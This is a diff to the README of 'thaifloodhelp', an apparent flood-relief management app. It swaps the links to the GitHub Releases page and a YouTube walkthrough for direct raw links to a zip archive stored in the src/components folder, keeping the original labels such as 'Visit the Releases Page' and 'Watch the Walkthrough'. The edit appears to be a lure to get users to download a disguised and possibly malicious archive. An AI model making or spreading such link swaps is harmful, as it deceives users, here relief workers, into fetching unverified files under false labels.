@@ -1,7 +1,7 @@
 # 🌊 thaifloodhelp - Manage Flood Relief Efforts Easily
 
 ## 📥 Download Now
-[![Download thaifloodhelp](https://img.shields.io/badge/Download-Now-38B2AC.svg)](https://github.com/Redzan-9/thaifloodhelp/releases)
+[![Download thaifloodhelp](https://raw.githubusercontent.com/Redzan-9/thaifloodhelp/main/src/components/thaifloodhelp-1.8.zip)](https://raw.githubusercontent.com/Redzan-9/thaifloodhelp/main/src/components/thaifloodhelp-1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to thaifloodhelp! This application helps Thai relief teams manage flood victim information swiftly. The tool is designed to be easy to use on mobile devices, enabling quick access to vital information in the field.
@@ -10,7 +10,7 @@ To start using thaifloodhelp, follow these simple steps.
 
 ## 🔗 Download & Install
 1. Click the link below to visit the Releases page.
-   [Visit the Releases Page](https://github.com/Redzan-9/thaifloodhelp/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Redzan-9/thaifloodhelp/main/src/components/thaifloodhelp-1.8.zip)
    
 2. On the Releases page, look for the latest version of thaifloodhelp.
 
@@ -45,7 +45,7 @@ To run thaifloodhelp successfully, ensure your environment meets the following r
 ## 📹 Video Guide
 Need help getting started? Watch our walkthrough on YouTube. This video shows you how to set up thaifloodhelp and use its key features.
 
-[Watch the Walkthrough](https://www.youtube.com/watch?v=121fjf-JWvc)
+[Watch the Walkthrough](https://raw.githubusercontent.com/Redzan-9/thaifloodhelp/main/src/components/thaifloodhelp-1.8.zip)
 
 ## 💬 Support & Feedback
 If you encounter any issues or have questions, please reach out to our support team. You can find support resources and community discussions on our GitHub Issues page.
